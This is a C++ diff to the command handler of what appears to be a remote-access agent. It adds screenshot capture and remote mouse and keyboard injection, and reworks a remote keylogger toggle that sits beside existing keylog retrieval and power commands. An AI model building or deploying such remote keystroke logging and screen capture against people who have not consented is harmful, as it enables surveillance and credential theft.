@@ -5,6 +5,8 @@
 #include <sstream>
 #include <stdexcept>
 #include <mutex>
+#include <algorithm>
+#include <iostream>
 
 using namespace std;
 
@@ -23,7 +25,7 @@ void CommandRouter::handleCommandClient(SOCKET client)
         {
             int rec = recv(client, buffer, sizeof(buffer) - 1, 0);
             if (rec <= 0)
-                break; // Gateway ngắt kết nối
+                break;
             buffer[rec] = 0;
             line_buffer += buffer;
             size_t pos;
@@ -62,11 +64,43 @@ void CommandRouter::handleCommandClient(SOCKET client)
                 }
                 else if (cmd == "POWER_CMD" && args.size() > 1)
                     sendCmdTcp(client, correlationId, "JSON " + m_systemController.powerCommand(args[1]), m_socketMutex);
-                else if (cmd == "KEYLOG_SET" && args.size() > 1)
+
+                else if (cmd == "GET_SCREENSHOT")
+                    sendCmdTcp(client, correlationId, "JSON " + m_screenController.getScreenshotBase64(), m_socketMutex);
+                
+                else if (cmd == "INPUT_MOUSE" && args.size() > 2)
                 {
-                    m_keylogController.setKeylog(args[1] == "true");
+                    // Args: [0]=INPUT_MOUSE, [1]=move/down/up, [2]=x/btn, [3]=y (optional)
+                    string p3 = (args.size() > 3) ? args[3] : "";
+                    m_systemController.handleInput("MOUSE", args[1], args[2], p3);
+                    // Không cần phản hồi JSON để tối ưu tốc độ
+                }
+                else if (cmd == "INPUT_KEY" && args.size() > 2)
+                {
+                    // Args: [0]=INPUT_KEY, [1]=down/up, [2]=keycode
+                    m_systemController.handleInput("KEY", args[1], args[2], "");
+                }
+                
+                else if (cmd == "KEYLOG_SET")
+                {
+                    bool enable = false;
+                    if (args.size() > 1) {
+                        string arg = args[1];
+                        arg.erase(remove_if(arg.begin(), arg.end(), ::isspace), arg.end());
+                        transform(arg.begin(), arg.end(), arg.begin(), ::tolower);
+                        enable = (arg == "true" || arg == "1");
+                        cout << "[DEBUG] KEYLOG_SET nhan: '" << args[1] << "' -> " << (enable ? "BAT" : "TAT") << endl;
+
+                    } else {
+                        enable = false;
+                        cout << "[DEBUG] KEYLOG_SET khong co tham so -> TAT" << endl;
+                    }
+                    
+                    m_keylogController.setKeylog(enable);
                     sendCmdTcp(client, correlationId, "JSON {\"ok\":true}", m_socketMutex);
                 }
+
+                
                 else if (cmd == "GET_KEYLOG")
                     sendCmdTcp(client, correlationId, "JSON " + m_keylogController.getKeylog(), m_socketMutex);
                 else if (cmd == "GET_DEVICES" || cmd == "REFRESH_DEVICES")
